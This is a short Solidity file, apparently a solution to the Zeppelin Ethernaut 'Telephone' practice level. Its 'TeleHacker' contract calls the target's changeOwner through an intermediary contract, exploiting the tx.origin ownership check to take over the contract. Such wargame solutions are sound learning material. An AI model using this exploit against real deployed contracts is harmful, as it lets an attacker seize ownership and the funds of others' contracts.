pragma solidity ^0.4.18;
 
contract Telephone {
  function changeOwner(address _owner) public;
}
contract TeleHacker {    
 
    function hack(address param) public{ /*param Is Your Zepplin Main Contract Address*/
    	Telephone target = Telephone(param);
        target.changeOwner(msg.sender);
    }
}
